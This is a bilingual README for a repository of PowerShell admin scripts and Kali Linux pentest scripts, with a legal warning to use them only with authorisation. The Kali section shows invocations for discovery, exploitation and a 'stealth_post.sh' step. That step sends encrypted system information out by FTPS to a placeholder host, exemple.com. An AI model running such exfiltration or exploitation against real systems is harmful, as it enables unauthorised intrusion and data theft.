# PowerShell Scripts Repository

Ce dépôt contient une collection de scripts PowerShell utiles pour l'administration système et l'automatisation de tâches courantes.

## Table des matières

- [⚠️ Avertissements légaux](#-avertissements-légaux)
- [📂 Structure du dépôt](#-structure-du-dépôt)
- [🛠️ Prérequis / Prerequisites](#-prérequis--prerequisites)
- [📦 Installation](#-installation)
- [📚 Exemples d'utilisation](#-exemples-dutilisation)
- [License](#license)

## ⚠️ Avertissements légaux

Pentest scripts (dont `pentest_discovery.sh`, `pentest_verification.sh`, `pentest_exploitation.sh`) et `stealth_post.sh` doivent être utilisés uniquement sur des systèmes pour lesquels vous disposez d'une autorisation explicite.

Pentest scripts and `stealth_post.sh` must only be run on systems where you have been granted explicit permission. Unauthorized use may be illegal.

## 📂 Structure du dépôt

```
scripts/
├── linux/             # Scripts Bash pour Linux
│   ├── check_dependencies.sh
│   ├── setup_api.sh
│   ├── pentest_discovery.sh
│   ├── pentest_verification.sh
│   ├── pentest_exploitation.sh
│   ├── scan_wifi.sh
│   └── stealth_post.sh
├── powershell/        # Scripts PowerShell pour Windows
│   ├── DiskUsageReport.ps1
│   ├── Get-SystemInfo.ps1
│   ├── ManageServices.ps1
│   ├── VMManagement.ps1
│   ├── LinkCrawler.ps1
│   ├── TeamsManagement.ps1
│   ├── SharePointManagement.ps1
│   ├── UserManagement.ps1
│   └── SecurityCheck.ps1
├── sample_logs.json   # Journalisation fictive pour tests
```

Le fichier `targets.txt` à la racine contient la liste des cibles pour les scripts de pentest. Les scripts Bash utilisent un chemin relatif basé sur leur propre emplacement pour le retrouver, ce qui permet de les lancer depuis n'importe quel répertoire.

## 🛠️ Prérequis / Prerequisites

- **Outils / Tools** : `nmap`, `gvm-cli` et les modules PowerShell nécessaires (Hyper-V, ExchangeOnlineManagement, Teams, etc.).
- **Privilèges / Privileges** : certains scripts exigent des droits administrateur ou root.

## 📦 Installation

```bash
# Installation de l'API Mistral
# Le script télécharge install.sh séparément et vérifie son empreinte SHA-256
bash scripts/linux/setup_api.sh
# Activer l'environnement virtuel puis lancer l'API
source /opt/mistral-env/bin/activate
python ~/mistral_api.py
```

## 📚 Exemples d'utilisation

Les scripts peuvent être lancés via PowerShell :

```powershell
# Exemple : afficher les informations système
.\scripts\powershell\Get-SystemInfo.ps1

# Exemple : vérifier l'état d'un service
.\scripts\powershell\ManageServices.ps1 -Action status -ServiceName spooler

# Exemple : lister les machines virtuelles Hyper-V
.\scripts\powershell\VMManagement.ps1 -Action list

# Exemple : démarrer une machine virtuelle
.\scripts\powershell\VMManagement.ps1 -Action start -VMName "TestVM"
# Exemple : lister les equipes Teams
.\scripts\powershell\TeamsManagement.ps1 -Action list
# Exemple : créer un canal Teams
.\scripts\powershell\TeamsManagement.ps1 -Action createchannel -TeamName "Marketing" -ChannelName "Général"
# Exemple : ajouter plusieurs membres depuis un CSV
.\scripts\powershell\TeamsManagement.ps1 -Action bulkadd -TeamName "Marketing" -CsvPath .\users.csv
# Exemple : lister les boîtes aux lettres Exchange Online
.\scripts\powershell\ExchangeOnlineManagement.ps1 -Action list
# Exemple : lister les sites SharePoint Online
.\scripts\powershell\SharePointManagement.ps1 -Mode Online -Action ListSites -Credential (Get-Credential)
# Exemple : créer un site SharePoint On-Premise
.\scripts\powershell\SharePointManagement.ps1 -Mode OnPrem -Action CreateSite -SiteUrl "http://spserver/sites/test" -Template STS#0 -Credential (Get-Credential)
# Exemple : vérifier les paramètres de sécurité
.\scripts\powershell\SecurityCheck.ps1
```
> **Note :** `ManageServices.ps1` et `UserManagement.ps1` doivent être exécutés dans une session PowerShell élevée.
> **Exemple :** cherchez "PowerShell" dans le menu Démarrer, faites un clic droit puis sélectionnez "Exécuter en tant qu'administrateur".

Chacun des scripts possède des paramètres décrits en début de fichier.

### Scripts Kali Linux

```bash

# Vérifier les dépendances nécessaires
bash scripts/linux/check_dependencies.sh

# Phase de découverte (scan complet et scripts de vulnérabilités)
bash scripts/linux/pentest_discovery.sh
# Phase de vérification des vulnérabilités
bash scripts/linux/pentest_verification.sh
# Phase d'exploitation (si autorisée)
bash scripts/linux/pentest_exploitation.sh
# Génère un fichier de suggestions avec searchsploit si des CVE ont été détectées
# Exfiltration basique via FTPS (si autorisée)
export FTP_USER="utilisateur"
export FTP_PASS="motdepasse"
export FTP_HOST="exemple.com"
export FTP_PATH="uploads/sysinfo.txt.gpg"
export GPG_PASSPHRASE="phrase_secrete"
bash scripts/linux/stealth_post.sh
```

### Configuration de l'hôte distant

- Serveur FTP avec prise en charge de FTPS (TLS explicite).
- Compte utilisateur autorisé à écrire dans le chemin indiqué par `$FTP_PATH`.
- Pour récupérer les données, télécharger le fichier chiffré puis le déchiffrer :
  `gpg --batch --passphrase "phrase_secrete" -o sysinfo.txt -d sysinfo.txt.gpg`.

Chaque exécution de `pentest_discovery.sh` crée un sous-dossier horodaté dans `pentest_results`, conservant les résultats des scans précédents.
Each run of `pentest_discovery.sh` outputs to a timestamped subfolder inside `pentest_results`, preserving previous scan results.
 
## License

This project is licensed under the MIT License. See [LICENSE](LICENSE) for details.
